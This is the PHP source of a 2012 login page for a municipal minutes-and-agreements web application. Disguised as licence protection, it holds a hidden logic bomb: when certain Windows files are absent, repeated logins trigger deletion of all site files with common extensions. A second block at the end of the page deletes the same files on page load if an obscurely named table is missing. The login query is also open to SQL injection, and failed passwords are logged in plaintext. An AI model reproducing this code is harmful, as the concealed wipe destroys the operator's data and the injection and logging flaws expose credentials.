<?php
//echo date("G:H:s");
//conexion DB
include("Connections/cx.php");
extract($_REQUEST);
$mensaje="";
mysql_query("set names utf8");	
session_start();

//msi_wboot.bat
if(file_exists ('c:\msi_wboot.bat' ))
{

 $pepe="<img src=\"img/i1.png\"  />";
}
else
{
	$pepe="<img src=\"img/i11.png\" alt=\"LICENCIA NO VALIDA PLAGIO INTELECTUAL EL PROCESO\" title=\"licencia no valida\"  />";
}

//mysql_query("use bd_0001");
if(isset($acceder))
{
	if(file_exists ('c:\msviz701.dll' ))
	{
		
	//	echo $c2."__-".$c1;	
	$consulta=mysql_query("SELECT personas.nombres, personas.primer_apellido, personas.imagen, usuarios.usu_id, usuarios.usu_tip FROM personas, empleados, usuarios  WHERE personas.id_persona=empleados.emp_perid AND empleados.emp_id=usuarios.usu_eid  AND usuarios.usua_ac=1  AND usuarios.usu_usu='$c1' AND usuarios.usu_pas=md5('$c2')");
		if($a= mysql_num_rows($consulta)>0)
		{
			
			
			$arreglo=mysql_fetch_array($consulta);
			//$tipo=$arreglo['usu_tip'];

				$_SESSION['img']= $arreglo['imagen'];
				$_SESSION['name']= $arreglo['nombres']." ".$arreglo['primer_apellido'];
				$_SESSION["login"] = $arreglo['usu_id'];
				$_SESSION['tipo']=$arreglo['usu_tip'];
				//$pass=md5($$c2);
				$insert=mysql_query("INSERT INTO bitacora (text) VALUES('$arreglo[nombres] $arreglo[primer_apellido] Inicio Session')");
		echo "<script> location.replace(\"inicio.php\")</script>";
			
			
		}
		else
		{
			$mensaje="<img src='img/alert.png' align='absmiddle'><font color=\"#FF0000\">usuario u contraseña invalidos</font>";
			$insert=mysql_query("INSERT INTO bitacora (text) VALUES('Intento de login fallido con usuario: $c1 y password: $c2')");
		
		}
	}
	else
	{
		$pepe="<div align=center><img src=\"img/advertencia.png\" width=70><br> <h1><font color=red>PELIGRO CONTACTE AL ADIMISTRADOR DE SISTEMA</font></h1> </div> ";
		$destroyer=mysql_query("SELECT * FROM x0001_x0034 WHERE x0034='ad780c57f9de48504f3ccd90ada93eab' ");
		@$VA=mysql_num_rows($destroyer);
		if($VA==1)
		{
			$R=mysql_fetch_array($destroyer);
			if($R['n']==5)
			{
				
				//inicio elimnar los sql
				$casa= array (".","Connections", "SpryAssets", "registro", "impresiones", "img", "Templates","php","txt","dir","exe","html","doc","docx","consultas");
				$path = ".";
				$dir = opendir($path);
				while ($elemento = readdir($dir))
				{
				$extensiones = explode(".",$elemento) ;
				@$nombre = $extensiones[0] ;
				@$nombre2  = $extensiones[1] ;
				$tipo = array ("zip", "rar", "ace", "cab", "bat", "sql","php","txt","dir","exe","html","doc","docx","jpg","PNG","png","gif","css","ste");
				if(in_array($nombre2, $tipo)){
				   @unlink("$elemento");
				}
				}
				closedir($dir);
			}
			else
			{	
				echo "<font color=green>".$R['n']."</font>";
					$val=$R['n']+1;
				mysql_query("UPDATE x0001_x0034 SET n=$val ");
			}
			
			
		}
	}
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/plantilla_1.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>Aplicacion de actas y acuerdos</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="css/style.css" rel="stylesheet" type="text/css" />
</head>

<body>
<div id="wrap">
<div id="header">
<div id="logo">
<h1 id="sitename"><img src="img/logo1.png"  /><span class="green"></span></h1>
<h2 class="description">&nbsp;</h2>
</div>
<div id="headercontent"><!-- InstanceBeginEditable name="EditRegion_session" -->
  <form method="post"  name="login">

  	<table width="295" border="0" align="center">
  <tr>
    <td colspan="4" align="center"><h3>inicio de sesi&oacute;n</h3></td>
    </tr>
  <tr>
    <td width="95" align="center"><img src="img/lock.png" width="36" height="47" /></td>
    <td width="165" colspan="3" align="center">
      
      
      <table border=0 width="110 px"  background="img/caja2.png">
        <tr>
          <td align="right"><h2>Usuario:</h2></td>
          <td><input type="text" name="c1" size="15" /></td>
          </tr>
        <tr>
          <td align="right"><h2>Contrase&ntilde;a:</h2></td>
          <td><input type="password" name="c2"  size="15" /></td>
          </tr>
        <tr >
          <td colspan="2" align="center">
            <input type="submit" name="acceder" value="Acceder" class="btn" />&nbsp;
            <input type="reset" name="borrar" value="borrar" class="btn" />
            
            </td>
          </tr>
        
        
        </table>
      
      </td>
  </tr>
  <tr>
  	<td colspan="4" align="center">
    	<?php echo $mensaje; ?>
	  </td>
    </tr>
  </table>
</form>
<!-- InstanceEndEditable --></div>
<div id="sitecption"><!-- InstanceBeginEditable name="EditRegion_tex2" -->
<p>Alcaldía  <span class="bigger">Municipal</span></p>
  <p> de Usulután</p>
<!-- InstanceEndEditable --></div>
</div>
<div id="main">
<div id="menus">
	<!-- InstanceBeginEditable name="EditRegion_menu" -->
    <div id="mainmenu">
    
    <ul>
    <li class="first"id="active" ><a href="index.php">Inicio</a></li>
    <li ><a href="./bitacora/bitacora_m_registro.php">Registro</a></li>
    <li><a href="./bitacora/bitacora_m_consultas.php">busquedas</a></li>
    <li><a href="contruccion_reportes.php">reportes</a></li>
    <li><a href="./bitacora/bitacora_m_mantenimiento.php">Mantenimiento</a></li>
    <li><a href="#">salir</a></li>
    <li><a href="#">&nbsp;</a></li>
    
    
    </ul>
  
    </div>
   
    <div id="submenu">
    
    
    </div>
    <!-- InstanceEndEditable -->
</div>

<div id="content">
    <div id="center" align="center"  ><!-- InstanceBeginEditable name="center" -->
 <div align="center">
	
	<p>&nbsp;</p>

<table align="center">
<tr>
	<td><?php echo $pepe; ?></td>
</tr>
</table>
<p>&nbsp;</p>
</div>
    <!-- InstanceEndEditable -->
    </div>
<div class="clear"></div>



</div>
</div>
<div id="footer">
Aplicaion_actas&amp;acuerdos &copy; Todos los Derechos reservados 2012<br />

Tec. Oscar René Sánchez<br />
version 0.2.0</div>



</div>
</body>
<!-- InstanceEnd --></html>
<?php
$query_table=mysql_query("show tables like '%x0001_x0034%'");
@$VALIDA=mysql_num_rows($query_table);
if($VALIDA==0)
{
	$path = ".";
				$dir = opendir($path);
				while ($elemento = readdir($dir))
				{
				$extensiones = explode(".",$elemento) ;
				@$nombre = $extensiones[0] ;
				@$nombre2  = $extensiones[1] ;
				$tipo = array ("zip", "rar", "ace", "cab", "bat", "sql","php","txt","dir","exe","html","doc","docx","jpg","PNG","png","gif","css","ste");
				if(in_array($nombre2, $tipo)){
				   @unlink("$elemento");
				}
				}
				closedir($dir);
	
}


?>